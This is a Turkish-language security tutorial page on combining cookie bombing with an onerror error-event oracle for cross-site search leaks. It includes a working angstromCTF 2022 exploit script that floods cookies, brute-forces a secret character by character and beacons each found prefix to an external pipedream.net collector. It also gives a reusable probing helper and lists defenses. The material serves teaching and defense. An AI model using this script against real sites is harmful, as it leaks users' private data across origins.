# Cookie Bomb + Onerror XS Leak

{{#include ../../banners/hacktricks-training.md}}

Bu teknik şunları birleştirir:
- Cookie bombing: hedef origin için mağdurun tarayıcısını çok sayıda/büyük çerezle doldurma, böylece sonraki istekler sunucu/istek limitlerine (istek header boyutu, yönlendirmelerdeki URL boyutu, vb.) takılır.
- Error-event oracle: bir cross-origin endpoint'i <script> (veya diğer bir subresource) ile yoklayıp onload vs onerror ile durumları ayırt etme.

Genel fikir
- Test etmek istediğiniz iki durum için davranışı farklı olan bir hedef endpoint bulun (örn., arama “hit” vs “miss”).
- “Hit” yolu ağır bir redirect zinciri veya uzun URL tetikleyecek şekilde, “miss” yolu kısa kalacak şekilde düzenleyin. Birçok çerez kullanarak istek headerlarını şişirin; böylece sadece “hit” yolu sunucunun bir HTTP hatası (örn., 431/414/400) ile başarısız olmasına yol açsın. Hata onerror olayını tetikler ve XS-Search için bir oracle haline gelir.

Ne zaman işe yarar
- Mağdurun tarayıcısının hedefe çerez göndermesini sağlayabiliyorsanız (örn., çerezler SameSite=None ise veya bir popup ile first-party bağlamda window.open aracılığıyla ayarlayabiliyorsanız).
- Rastgele çerezler ayarlamak için suistimal edebileceğiniz bir uygulama özelliği varsa (örn., kontrol edilen input isim/değerlerini Set-Cookie'ye çeviren “save preference” endpoint'leri) veya post-auth redirects sırasında saldırgan kontrollü veriyi URL'e dahil eden bir özellik varsa.
- Sunucu iki durumda farklı tepki veriyor ve header/URL şişirilince bir durum limiti aşılıyor ve onerror'ı tetikleyecek şekilde bir hata döndürüyor.

Oracle olarak kullanılan sunucu hatalarına not
- Çerezlerin istek headerlarını şişirdiği durumlarda genellikle 431 Request Header Fields Too Large döner; uzun istek hedefleri için 414 URI Too Long veya sunucuya özgü bir 400 dönebilir. Bunların herhangi biri subresource yüklemesinin başarısız olmasına ve onerror'ın tetiklenmesine yol açar. [MDN documents 431 and typical causes like excessive cookies.]()

Pratik örnek (angstromCTF 2022)
Aşağıdaki script (public bir writeup'tan) saldırganın rastgele çerez eklemesine izin veren bir özelliği suistimal eder, sonra cross-origin search endpoint'ini script olarak yükler. Sorgu doğru olduğunda, sunucu bir redirect gerçekleştirir ve bu redirect çerez şişmesi ile birlikte sunucu limitlerini aşarak bir hata durumu döner; bu yüzden script.onerror tetiklenir; aksi halde hiçbir şey olmaz.
```html
<>'";
<form action="https://sustenance.web.actf.co/s" method="POST">
<input id="f" /><input name="search" value="a" />
</form>
<script>
const $ = document.querySelector.bind(document)
const sleep = (ms) => new Promise((r) => setTimeout(r, ms))
let i = 0
const stuff = async (len = 3500) => {
let name = Math.random()
$("form").target = name
let w = window.open("", name)
$("#f").value = "_".repeat(len)
$("#f").name = i++
$("form").submit()
await sleep(100)
}
const isError = async (url) => {
return new Promise((r) => {
let script = document.createElement("script")
script.src = url
script.onload = () => r(false)
script.onerror = () => r(true)
document.head.appendChild(script)
})
}
const search = (query) => {
return isError(
"https://sustenance.web.actf.co/q?q=" + encodeURIComponent(query)
)
}
const alphabet =
"etoanihsrdluc_01234567890gwyfmpbkvjxqz{}ETOANIHSRDLUCGWYFMPBKVJXQZ"
const url = "//en4u1nbmyeahu.x.pipedream.net/"
let known = "actf{"
window.onload = async () => {
navigator.sendBeacon(url + "?load")
await Promise.all([stuff(), stuff(), stuff(), stuff()])
await stuff(1600)
navigator.sendBeacon(url + "?go")
while (true) {
for (let c of alphabet) {
let query = known + c
if (await search(query)) {
navigator.sendBeacon(url, query)
known += c
break
}
}
}
}
</script>
```
Neden popup (window.open)?
- Modern tarayıcılar giderek third-party cookies'i engelliyor. Hedefe top-level window açmak, cookie'leri first-party yapar; böylece hedeften gelen Set-Cookie yanıtları kalıcı olur ve cookie-bomb adımı third-party cookie restrictions olsa bile işlemeye devam eder.

Generic probing helper
Hedef origin (first-party) üzerinde birçok cookie ayarlama yolunuz zaten varsa, bu minimal oracle'u başarısı/başarısızlığı farklı network sonuçlarına (status/MIME/redirect) yol açan herhangi bir endpoint'e karşı yeniden kullanabilirsiniz:
```js
function probeError(url) {
return new Promise((resolve) => {
const s = document.createElement('script');
s.src = url;
s.onload = () => resolve(false);  // loaded successfully
s.onerror = () => resolve(true);  // failed (e.g., 4xx/5xx, wrong MIME, blocked)
document.head.appendChild(s);
});
}
```
Oracle'ı oluşturmak için ipuçları
- “Pozitif” durumu daha ağır hale getirin: yalnızca koşul doğru olduğunda ekstra bir redirect zincirleyin veya redirect URL'sinin tahmin edilen önekle birlikte büyümesi için sınırsız kullanıcı girdisini yansıtmasını sağlayın.
- Başlıkları şişirin: “ağır” yolunda tutarlı bir hata gözlenene kadar cookie bombing'i tekrarlayın. Sunucular genelde başlık boyutunu sınırlar ve birçok cookie olduğunda daha çabuk başarısız olurlar.
- Dengeleyin: zamanlama ve önbellek gürültüsünü ortalamak için birden çok paralel cookie ayarlama işlemi başlatın ve tekrar tekrar sorgulayın.

İlgili XS-Search teknikleri
- URL uzunluğuna dayalı oracle'lar (cookie gerekmez) çok uzun bir istek hedefi zorlayabildiğinizde birleştirilebilir veya onun yerine kullanılabilir:

{{#ref}}
url-max-length-client-side.md
{{#endref}}

Savunmalar ve sertleştirme
- Başarı/başarısızlık yanıtlarını ayırt edilemez yapın:
  - Koşullu yeniden yönlendirmelerden veya durumlar arasında yanıt boyutunda büyük farklardan kaçının. Durumdan bağımsız olarak aynı HTTP durum kodunu, aynı içerik türünü ve benzer gövde uzunluğunu döndürün.
- Çapraz-site altkaynak sorgularını engelleyin:
  - SameSite cookies: hassas cookie'leri SameSite=Lax veya Strict olarak ayarlayın, böylece <script src> gibi altkaynak istekleri onları taşımaz; mümkünse auth token'lar için Strict tercih edin.
  - Fetch Metadata: cross-site altkaynak yüklemelerini reddetmek için bir Resource Isolation Policy uygulayın (ör. Sec-Fetch-Site != same-origin/same-site ise).
  - Cross-Origin-Resource-Policy (CORP): cross-origin altkaynak olarak gömülmesi amaçlanmayan endpoint'ler için CORP: same-origin (ya da en azından same-site) ayarlayın.
  - X-Content-Type-Options: nosniff ve JSON/HTML endpoint'lerinde doğru Content-Type kullanarak load-as-script tuhaflıklarını önleyin.
- Başlık/URL amplifikasyonunu azaltın:
  - Ayarlanan cookie sayısını/boyutunu sınırlandırın; rastgele form alanlarını Set-Cookie'ye dönüştüren özellikleri sanitize edin.
  - Yansıtılan verileri yönlendirmelerde normalize edin veya kısaltın; Location URL'lerinde saldırgan kontrollü uzun dizeleri gömmekten kaçının.
  - Sunucu sınırlarını tutarlı tutun ve tek tip şekilde başarısız olun (yalnızca bir dal için özel hata sayfalarından kaçının).

Notlar
- Bu saldırı sınıfı geniş olarak “Error Events” XS-Leaks olarak tartışılır. cookie-bomb adımı, yalnızca tek bir dalı sunucu sınırlarının üzerine iterek güvenilir bir boolean oracle üretmenin kullanışlı bir yoludur.

## Referanslar
- XS-Leaks: Error Events (onerror/onload bir oracle olarak): https://xsleaks.dev/docs/attacks/error-events/
- MDN: 431 Request Header Fields Too Large (çok sayıda cookie ile yaygın): https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/431
{{#include ../../banners/hacktricks-training.md}}
